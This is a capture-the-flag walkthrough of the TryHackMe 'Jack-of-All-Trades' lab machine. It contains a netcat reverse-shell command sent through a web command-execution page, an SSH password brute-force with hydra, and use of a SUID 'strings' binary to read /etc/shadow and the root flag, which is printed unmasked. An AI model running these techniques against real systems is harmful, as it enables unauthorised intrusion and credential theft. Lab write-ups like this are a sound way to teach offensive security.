@@ -1,0 +1,290 @@
+JackOfAllTrades is a simple yet challenging boot2root machine on Tryhackme.
+Its a nice machine to practice steganography and web penetesting skills.
+Lets start off with scanning for all the ports:
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Jackofalltrades# nmap -A -T4 10.10.208.144 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 20:21 IST
+Nmap scan report for 10.10.208.144
+Host is up (0.15s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Jack-of-all-trades!
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
+|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
+|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
+|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/9%OT=22%CT=1%CU=42328%PV=Y%DS=2%DC=T%G=Y%TM=5F80793
+OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)SEQ
+OS:(SP=103%GCD=1%ISR=10D%TI=Z%CI=I%TS=B)OPS(O1=M505ST11NW6%O2=M505ST11NW6%O
+OS:3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=68DF%W2=
+OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSN
+OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
+OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+
+Nmap scan results are above:
+
+As you can see the port are reversed and it really confuses a lot ahah.
+
+Lets fire up dirb and nikto for web enumeration.
+
+Just a normal assets directory.
+
+No result with nikto.
+
+I was not able to get the webpage,the firefox was displaying error:
+
+This address is restricted.
+So we have to override the port :
+Follow me:
+
+1) Type about:config in the URL
+
+2) network.security.ports.banned.override ,Set the value to 22
+
+3) If its not displaying then you can add new string and then the value.
+
+4) Refresh the page and then you can access it.
+
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Jackofalltrades# curl http://10.10.208.144:22/
+<html>
+        <head>
+                <title>Jack-of-all-trades!</title>
+                <link href="assets/style.css" rel=stylesheet type=text/css>
+        </head>
+        <body>
+                <img id="header" src="assets/header.jpg" width=100%>
+                <h1>Welcome to Jack-of-all-trades!</h1>
+                <main>
+                        <p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
+                        <p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
+                        <p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
+                        <p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
+                        <img src="assets/stego.jpg">
+                        <p>I make a lot of models myself, but I also do toys, like this one:</p>
+                        <img src="assets/jackinthebox.jpg">
+                        <!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
+
+                        <!--  	 UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
+
+
+                        <p>I hope you choose to employ me. I love making new friends!</p>
+                        <p>Hope to see you soon!</p>
+                        <p id="signature">Jack</p>
+                </main>
+        </body>
+</html>
+
+
+Can u look at that note:
+It can be a way to get further access.
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Jackofalltrades# echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogd" | base64 -d
+
+Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password:  u?WtKSraq
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Jackofalltrades# 
+
+There is a hidden encoded string at the page source of /recovery.php
+
+So after researching a lot I found out that :
+Base32 -> Hex -> rot13
+
+We get the following text:
+
+Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
+
+I got redirected to wikipedia page of stegasauras.So its something related to stegnography.
+I downloaded all the images on the homepage and used the recently extracted password.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Jackofalltrades# steghide extract -sf stego.jpg 
+Enter passphrase: 
+steghide: could not extract any data with that passphrase!
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Jackofalltrades# steghide extract -sf stego.jpg 
+Enter passphrase: 
+wrote extracted data to "creds.txt".
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Jackofalltrades#
+
+SO we use the password that we found ->  u?WtKSraq
+
+(Rabbithole ahead)
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Jackofalltrades# cat creds.txt 
+Hehe. Gotcha!
+
+You're on the right path, but wrong image!
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Jackofalltrades# 
+omfg
+
+Got actual stuff :)
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Jackofalltrades# cat cms.creds 
+Here you go Jack. Good thing you thought ahead!
+
+Username: jackinthebox
+Password: TplFxiSHjY
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Jackofalltrades# 
+
+
+Go this in the header.jpg file.
+
+GET me a 'cmd' and I'll run it for you Future-Jack
+
+Request:
+
+http://10.10.252.181:22/nnxhweOV/index.php?cmd=id
+
+Response:
+
+GET me a 'cmd' and I'll run it for you Future-Jack. uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+http://10.10.252.181:22/nnxhweOV/index.php?cmd=nc%2010.9.81.62%201234%20-e/bin/sh
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Jackofalltrades# nc -nvlp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.252.181 59455
+python -c "import pty;pty.spawn('/bin/bash')"
+www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ 
+
+Nice atleast we got into the machine and only the part is with the privilege escalation.
+
+Lets see what we can do.
+
+*hclqAzj+2GC+=0K
+eN<A@n^zI?FE$I5,
+X<(@zo2XrEN)#MGC
+,,aE1K,nW3Os,afb
+ITMJpGGIqg1jn?>@
+0HguX{,fgXPE;8yF
+sjRUb4*@pz<*ZITu
+[8V7o^gl(Gjt5[WB
+yTq0jI$d}Ka<T}PD
+Sc.[[2pL<>e)vC4}
+9;}#q*,A4wd{<X.T
+M41nrFt#PcV=(3%p
+GZx.t)H$&awU;SO<
+.MVettz]a;&Z;cAC
+2fh%i9Pr5YiYIf51
+TDF@mdEd3ZQ(]hBO
+v]XBmwAk8vk5t3EF
+9iYZeZGQGG9&W4d1
+8TIFce;KjrBWTAY^
+SeUAwt7EB#fY&+yt
+n.FZvJ.x9sYe5s5d
+8lN{)g32PG,1?[pM
+z@e1PmlmQ%k5sDz@
+ow5APF>6r,y4krSo
+
+We got a list of password for the user - jack.
+We can try bruteforcing the ssh using hydra
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Jackofalltrades# hydra -l jack -P password.txt ssh://10.10.252.181:80   
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-09 22:02:21
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
+[DATA] attacking ssh://10.10.252.181:80/
+[80][ssh] host: 10.10.252.181   login: jack   password: ITMJpGGIqg1jn?>@
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-09 22:02:26
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Jackofalltrades# 
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Jackofalltrades# ssh jack@10.10.252.181 -p 80
+jack@10.10.252.181's password: 
+jack@jack-of-all-trades:~$ id
+uid=1000(jack) gid=1000(jack) groups=1000(jack),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth),1001(dev)
+jack@jack-of-all-trades:~$ 
+
+We will get the user.jpg file in our system and after it I found the user flag:
+User flag : securi-tay2020_{########################}
+
+So now lets try to get root flag.
+
+jack@jack-of-all-trades:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/pt_chown
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/strings
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/procmail
+/usr/sbin/exim4
+/bin/mount
+/bin/umount
+/bin/su
+
+As you can see we have SUID bit set on strings and we can use strings to view any file as root.
+Follow me:
+
+jack@jack-of-all-trades:~$ file=/etc/shadow
+
+jack@jack-of-all-trades:~$ /usr/bin/strings $file
+root:$6$b3.jqCVW$RhHJyUpN81dfuW6J..8rTYX..7msovXxtbwQX4w8SIqxTuGOGpuKVft.1Cw1yvpGiHh2LULov1EA5H2m33dPk/:18321:0:99999:7:::
+daemon:*:16550:0:99999:7:::
+bin:*:16550:0:99999:7:::
+sys:*:16550:0:99999:7:::
+sync:*:16550:0:99999:7:::
+games:*:16550:0:99999:7:::
+man:*:16550:0:99999:7:::
+lp:*:16550:0:99999:7:::
+mail:*:16550:0:99999:7:::
+news:*:16550:0:99999:7:::
+uucp:*:16550:0:99999:7:::
+proxy:*:16550:0:99999:7:::
+www-data:*:16550:0:99999:7:::
+backup:*:16550:0:99999:7:::
+list:*:16550:0:99999:7:::
+irc:*:16550:0:99999:7:::
+gnats:*:16550:0:99999:7:::
+nobody:*:16550:0:99999:7:::
+systemd-timesync:*:16550:0:99999:7:::
+systemd-network:*:16550:0:99999:7:::
+systemd-resolve:*:16550:0:99999:7:::
+systemd-bus-proxy:*:16550:0:99999:7:::
+uuidd:*:16550:0:99999:7:::
+Debian-exim:!:16550:0:99999:7:::
+messagebus:*:16550:0:99999:7:::
+statd:*:16550:0:99999:7:::
+avahi-autoipd:*:16550:0:99999:7:::
+sshd:*:16550:0:99999:7:::
+
+
+jack@jack-of-all-trades:~$ file=/root/root.txt
+jack@jack-of-all-trades:~$ /usr/bin/strings $file
+ToDo:
+1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
+2.Make T-Rex model!
+3.Meet up with Johny for a pint or two
+4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
+5.Remember to finish that contract for Lisa.
+6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
+jack@jack-of-all-trades:~$ 
+
+
+And we are done with it.
+
+Thank you bois... Happy Hacking :)
